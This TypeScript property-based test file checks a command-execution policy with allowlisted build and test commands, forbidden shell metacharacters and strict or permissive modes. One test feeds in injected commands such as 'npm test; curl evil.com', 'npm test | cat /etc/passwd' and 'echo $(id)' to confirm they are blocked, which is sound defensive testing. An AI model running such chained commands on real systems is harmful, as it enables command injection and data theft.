import { describe, it, expect } from "vitest";
import * as fc from "fast-check";
import { isCommandAllowed, filterCommands } from "../src/executor/policy.js";

/**
 * Property 2: Preservation - Strict Mode and Security Blocking
 * 
 * **Validates: Requirements 3.1, 3.2, 3.3, 3.4, 3.5**
 * 
 * These tests verify that the fix does not break existing behavior for:
 * - Strict mode blocking of non-whitelisted commands
 * - Forbidden character blocking in both modes
 * - Allowlist command validation in both modes
 * 
 * IMPORTANT: These tests are run on UNFIXED code first to observe baseline behavior,
 * then run again after the fix to ensure preservation.
 */

describe("Preservation Property Tests", () => {
    // Forbidden characters that should be blocked in both modes
    const FORBIDDEN_CHARS = [";", "|", "&", "`", "$", "<", ">", "(", ")", "[", "]", "{", "}", "!", "\n", "\r", "\\"];

    // Allowlist commands that should work in both modes
    const ALLOWLIST_COMMANDS = [
        "npm test",
        "npm ci",
        "npm install",
        "npm run build",
        "pnpm install",
        "yarn test",
        "pytest",
        "python -m pytest",
        "go test",
        "cargo test",
        "cat package.json",
        "ls",
        "echo hello",
        "git status",
    ];

    describe("Property 2.1: Strict mode blocks non-whitelisted commands", () => {
        it("should block all non-whitelisted commands in strict mode", () => {
            fc.assert(
                fc.property(
                    // Generate safe command strings (no forbidden chars)
                    fc.stringMatching(/^[a-zA-Z0-9 ._-]+$/),
                    (command) => {
                        // Skip empty or whitespace-only commands
                        if (!command.trim()) return true;

                        // Skip if command is in allowlist
                        const bin = command.trim().split(/\s+/)[0];
                        const isInAllowlist = ALLOWLIST_COMMANDS.some(cmd => cmd.startsWith(bin + " ") || cmd === bin);
                        if (isInAllowlist) return true;

                        // Non-whitelisted commands should be blocked in strict mode
                        const result = isCommandAllowed(command, "strict");
                        expect(result).toBe(false);
                        return true;
                    }
                ),
                { numRuns: 100 }
            );
        });

        it("should block specific non-whitelisted commands in strict mode", () => {
            // Specific examples that should be blocked
            expect(isCommandAllowed("node server.js", "strict")).toBe(false);
            expect(isCommandAllowed("python setup.py install", "strict")).toBe(false);
            expect(isCommandAllowed("ruby script.rb", "strict")).toBe(false);
            expect(isCommandAllowed("wget file", "strict")).toBe(false);
            expect(isCommandAllowed("curl https://example.com", "strict")).toBe(false);
        });
    });

    describe("Property 2.2: Forbidden characters blocked in all modes", () => {
        it("should block commands with forbidden metacharacters in permissive mode", () => {
            fc.assert(
                fc.property(
                    // Generate base command
                    fc.constantFrom(...ALLOWLIST_COMMANDS),
                    // Pick a forbidden character
                    fc.constantFrom(...FORBIDDEN_CHARS),
                    // Generate suffix (non-empty, non-whitespace to ensure forbidden char is in the middle)
                    fc.stringMatching(/^[a-zA-Z0-9._-]{1,20}$/),
                    (baseCommand, forbiddenChar, suffix) => {
                        // Insert forbidden character into command (in the middle, not at the end)
                        const command = `${baseCommand}${forbiddenChar}${suffix}`;
                        
                        // Should be blocked in permissive mode
                        const result = isCommandAllowed(command, "permissive");
                        expect(result).toBe(false);
                        return true;
                    }
                ),
                { numRuns: 100 }
            );
        });

        it("should block commands with forbidden metacharacters in strict mode", () => {
            fc.assert(
                fc.property(
                    // Generate base command
                    fc.constantFrom(...ALLOWLIST_COMMANDS),
                    // Pick a forbidden character
                    fc.constantFrom(...FORBIDDEN_CHARS),
                    // Generate suffix (non-empty, non-whitespace to ensure forbidden char is in the middle)
                    fc.stringMatching(/^[a-zA-Z0-9._-]{1,20}$/),
                    (baseCommand, forbiddenChar, suffix) => {
                        // Insert forbidden character into command (in the middle, not at the end)
                        const command = `${baseCommand}${forbiddenChar}${suffix}`;
                        
                        // Should be blocked in strict mode
                        const result = isCommandAllowed(command, "strict");
                        expect(result).toBe(false);
                        return true;
                    }
                ),
                { numRuns: 100 }
            );
        });

        it("should block specific commands with forbidden characters", () => {
            // Semicolon
            expect(isCommandAllowed("npm test; curl evil.com", "permissive")).toBe(false);
            expect(isCommandAllowed("npm test; curl evil.com", "strict")).toBe(false);
            
            // Pipe
            expect(isCommandAllowed("npm test | cat /etc/passwd", "permissive")).toBe(false);
            expect(isCommandAllowed("npm test | cat /etc/passwd", "strict")).toBe(false);
            
            // Ampersand
            expect(isCommandAllowed("npm test && curl evil.com", "permissive")).toBe(false);
            expect(isCommandAllowed("npm test && curl evil.com", "strict")).toBe(false);
            
            // Backtick
            expect(isCommandAllowed("echo `whoami`", "permissive")).toBe(false);
            expect(isCommandAllowed("echo `whoami`", "strict")).toBe(false);
            
            // Dollar sign (command substitution)
            expect(isCommandAllowed("echo $(id)", "permissive")).toBe(false);
            expect(isCommandAllowed("echo $(id)", "strict")).toBe(false);
        });
    });

    describe("Property 2.3: Allowlist commands work in both modes", () => {
        it("should allow all allowlist commands in strict mode", () => {
            fc.assert(
                fc.property(
                    fc.constantFrom(...ALLOWLIST_COMMANDS),
                    (command) => {
                        const result = isCommandAllowed(command, "strict");
                        expect(result).toBe(true);
                        return true;
                    }
                ),
                { numRuns: ALLOWLIST_COMMANDS.length }
            );
        });

        it("should allow all allowlist commands in permissive mode", () => {
            fc.assert(
                fc.property(
                    fc.constantFrom(...ALLOWLIST_COMMANDS),
                    (command) => {
                        const result = isCommandAllowed(command, "permissive");
                        expect(result).toBe(true);
                        return true;
                    }
                ),
                { numRuns: ALLOWLIST_COMMANDS.length }
            );
        });
    });

    describe("Property 2.4: filterCommands correctly partitions commands", () => {
        it("should partition commands into allowed and blocked in strict mode", () => {
            fc.assert(
                fc.property(
                    // Generate array of unique commands (mix of allowlist and non-allowlist)
                    fc.uniqueArray(
                        fc.oneof(
                            fc.constantFrom(...ALLOWLIST_COMMANDS),
                            fc.stringMatching(/^[a-zA-Z0-9 ._-]+$/).filter(s => s.trim().length > 0)
                        ),
                        { minLength: 0, maxLength: 10 }
                    ),
                    (commands) => {
                        const result = filterCommands(commands, "strict");
                        
                        // All commands should be in either allowed or blocked
                        expect(result.allowed.length + result.blocked.length).toBe(commands.length);
                        
                        // Each allowed command should pass isCommandAllowed
                        for (const cmd of result.allowed) {
                            expect(isCommandAllowed(cmd, "strict")).toBe(true);
                        }
                        
                        // Each blocked command should fail isCommandAllowed
                        for (const cmd of result.blocked) {
                            expect(isCommandAllowed(cmd, "strict")).toBe(false);
                        }
                        
                        return true;
                    }
                ),
                { numRuns: 50 }
            );
        });

        it("should handle empty command list", () => {
            const result = filterCommands([], "strict");
            expect(result.allowed).toEqual([]);
            expect(result.blocked).toEqual([]);
            
            const result2 = filterCommands([], "permissive");
            expect(result2.allowed).toEqual([]);
            expect(result2.blocked).toEqual([]);
        });
    });
});
